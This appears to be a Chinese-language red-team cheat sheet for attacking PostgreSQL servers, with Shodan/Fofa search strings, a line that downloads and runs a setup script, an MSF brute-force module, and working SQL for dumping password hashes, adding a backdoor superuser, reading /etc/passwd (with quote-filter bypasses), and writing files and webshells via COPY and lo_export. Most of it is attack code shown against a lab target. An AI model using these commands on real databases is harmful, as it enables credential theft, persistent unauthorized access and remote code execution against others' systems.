# PostgreSQL
> shodan : "port:5432 PostgreSQL"
> fofa : app="PostgreSQL
**注入**
- [PostgreSQL数据库注入笔记](../../Web安全/Web_Generic/SQLi.md#PostgreSQL)
**通过 docker 搭建环境**
```bash
wget -O f8x-dev https://f8x.io/dev
bash f8x-dev -postgres
```
**相关文章**
- [渗透中利用postgresql getshell](https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql%20getshell/)
- https://github.com/safe6Sec/PentestDB/blob/master/PostgreSQL.md
- https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md
- [A Penetration Tester’s Guide to PostgreSQL by David Hayter](https://hakin9.org/a-penetration-testers-guide-to-postgresql/)
- [Hacking PostgreSQL](https://tttang.com/archive/854/)
- [PL/Python安装和使用](https://valleylord.github.io/post/201410-postgres-plpython-install/)
- [PostgreSQL for red teams](https://www.unix-ninja.com/p/postgresql_for_red_teams)
- [SQL INJECTION AND POSTGRES - AN ADVENTURE TO EVENTUAL RCE](https://pulsesecurity.co.nz/articles/postgres-sqli)
- https://book.hacktricks.xyz/pentesting/pentesting-postgresql
- https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
- [数据库：从注入到提权的全家桶套餐](https://www.freebuf.com/articles/database/270106.html)
- [Postgresql 渗透总结](https://tttang.com/archive/1547/)
**相关案例**
- [实战案例：针对某系统postgresql注入](https://mp.weixin.qq.com/s/I5hDjIEzn0rKA9aCZsJw9w)
- [记一次pgsql数据库漏洞利用](https://xz.aliyun.com/t/10202)
- [Postgresql Superuser SQL注入 RCE之旅](https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/)
- [又记一次安服仔薅洞实战-未授权之发现postgresql注入](https://forum.butian.net/share/1344)
- [Wiz Research discovers "ExtraReplica"— a cross-account database vulnerability in Azure PostgreSQL](https://www.wiz.io/blog/wiz-research-discovers-extrareplica-cross-account-database-vulnerability-in-azure-postgresql/)
**相关工具**
- [No-Github/postgresql_udf_help](https://github.com/No-Github/postgresql_udf_help) - PostgreSQL 提权辅助脚本
- [T3st0r-Git/hack_postgres](https://github.com/T3st0r-Git/hack_postgres) - 便捷地使用 PostgreSQL 自定义函数来执行系统命令，适用于数据库管理员知道 postgres 密码却不知道 ssh 或 RDP 密码的时候在服务器执行系统命令。
---
**MSF 爆破**
```bash
use auxiliary/scanner/postgres/postgres_login
```
## 信息收集
**查看服务器端版本**
```sql
-- 详细信息
select version();
-- 版本信息
show server_version;
select pg_read_file('PG_VERSION', 0, 200);
-- 数字版本信息包括小版号
SHOW server_version_num;
SELECT current_setting('server_version_num');
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/5.png)
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/6.png)
**列目录**
```sql
-- 注意: 在早期的 PostgreSQL 版本中,pg_ls_dir 不允许使用绝对路径
select pg_ls_dir('/etc');
-- 获取 pgsql 安装目录
select setting from pg_settings where name = 'data_directory';
-- 查找 pgsql 配置文件路径
select setting from pg_settings where name='config_file'
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/13.png)
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/30.png)
**列出数据库**
```sql
SELECT datname FROM pg_database;
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/14.png)
**查看支持的语言**
```sql
select * from pg_language;
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/22.png)
**查看安装的扩展**
```sql
select * from pg_available_extensions;
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/23.png)
**查看服务器 ip 地址**
```sql
-- 这里是运行在 docker 里的靶机,所以 ip 不一致
select inet_server_addr()
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/38.png)
---
## 账号操作
**查看当前用户是不是管理员权限**
```sql
SELECT current_setting('is_superuser');
-- on 代表是, off 代表不是
SHOW is_superuser;
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```
**查询密码**
```sql
SELECT usename, passwd FROM pg_shadow;
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/7.png)
```sql
SELECT rolname,rolpassword FROM pg_authid;
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/19.png)
可以看到,目前查询到的用户 hash 已经是 scram-sha-256,在以前的版本是加盐md5
我们可以查询当前的加密方式
```sql
-- password_encryption参数决定了密码怎么被hash
SELECT name,setting,source,enumvals FROM pg_settings WHERE name = 'password_encryption';
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/20.png)
**添加用户**
```sql
--创建 f0x，赋予角色属性
create user f0x password 'Abcd1234' superuser createrole createdb
--添加 f0x 到角色组
grant postgres to f0x
```
**修改一个角色为管理员角色**
```sql
alter role f0x createrole;
```
**更改密码**
```sql
ALTER USER user_name WITH PASSWORD 'new_password';
```
**查看用户**
```sql
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```
**查看管理员用户**
```sql
SELECT usename FROM pg_user WHERE usesuper IS TRUE
```
**获取用户角色**
```sql
SELECT
      r.rolname,
      r.rolsuper,
      r.rolinherit,
      r.rolcreaterole,
      r.rolcreatedb,
      r.rolcanlogin,
      r.rolconnlimit, r.rolvaliduntil,
  ARRAY(SELECT b.rolname
        FROM pg_catalog.pg_auth_members m
        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
        WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/18.png)
---
## PostgreSQL 读文件
**方法1 pg_read_file**
```sql
-- 注意: 在早期的 PostgreSQL 版本中,pg_read_file 不允许使用绝对路径
select pg_read_file('/etc/passwd');
-- 单引号被转义的情况下使用
select/**/PG_READ_FILE($$/etc/passwd$$)
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/15.png)
**方法2**
```sql
create table testf0x(t TEXT);
copy testf0x from '/etc/passwd';
select * from testf0x limit 1 offset 0;
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/8.png)
**方法3 lo_import**
lo_import 允许指定文件系统路径。该文件将被读取并加载到一个大对象中，并返回该对象的 OID。
```sql
Select lo_import('/etc/passwd',12345678);
select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno)a
-- 单引号被转义的情况下使用
select/**/lo_import($$/etc/passwd$$,11111);
select/**/cast(encode(data,$$base64$$)as/**/integer)/**/from/**/pg_largeobject/**/where/**/loid=11111
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/9.png)
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/10.png)
---
## PostgreSQL 写文件
**写 webshell 所需的利用条件**
- 拥有网站路径写入权限
- 知道网站绝对路径
**方法1 COPY**
COPY 命令可以用于表和文件之间交换数据，这里可以用它写 webshell
```sql
COPY (select '') to '/tmp/1.php';
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/1.png)
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/2.png)
也可以 base64 一下
```sql
COPY (select convert_from(decode('ZmZmZmZmZmYweA==','base64'),'utf-8')) to '/tmp/success.txt';
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/16.png)
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/17.png)
**方法2 lo_export**
lo_export 采用大对象 OID 和路径，将文件写入路径。
```sql
select lo_from_bytea(12349,'ffffffff0x');
SELECT lo_export(12349, '/tmp/ffffffff0x.txt');
-- base64 的形式
select lo_from_bytea(12350,decode('ZmZmZmZmZmYweA==','base64'));
SELECT lo_export(12350, '/tmp/ffffffff0x.txt');
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/36.png)
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/37.png)
**方法3 lo_export + pg_largeobject**
```sql
-- 记下生成的lo_creat ID
select lo_creat(-1);
-- 替换 24577 为生成的lo_creat ID
INSERT INTO pg_largeobject(loid, pageno, data) values (24577, 0, decode('ZmZmZmZmZmYweA==', 'base64'));
select lo_export(24577, '/tmp/success.txt');
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/31.png)
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/32.png)
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/33.png)
如果内容过多，那么首先创建一个 OID 作为写入的对象, 然后通过 0,1,2,3… 分片上传但是对象都为 12345 最后导出到 /tmp 目录下, 收尾删除 OID
写的文件每一页不能超过 2KB，所以我们要把数据分段，这里我就不拿 .so 文件为例了,就随便写个 txt 举个例子
```sql
SELECT lo_create(12345);
INSERT INTO pg_largeobject VALUES (12345, 0, decode('6666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 1, decode('666666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 2, decode('6666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 3, decode('663078', 'hex'));
SELECT lo_export(12345, '/tmp/ffffffff0x.txt');
SELECT lo_unlink(12345);
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/11.png)
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/12.png)
或者还可以用 lo_put 在后面拼接进行写入
```sql
select lo_create(11116);
select lo_put(11116,0,'dGVzdDEyM');
select lo_put(11116,9,'zQ1Ng==');
select lo_from_bytea(11141,decode(encode(lo_get(11116),'escape'),'base64'));
select lo_export(11141,'/tmp/test.txt');
SELECT lo_unlink(11141);
```
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/45.png)
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/46.png)
![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/47.png)
结束记得清理 OID 内容
```sql
-- 查看创建的 lo_creat ID
select * from pg_largeobject
-- 使用 lo_unlink 进行删除
SELECT lo_unlink(12345);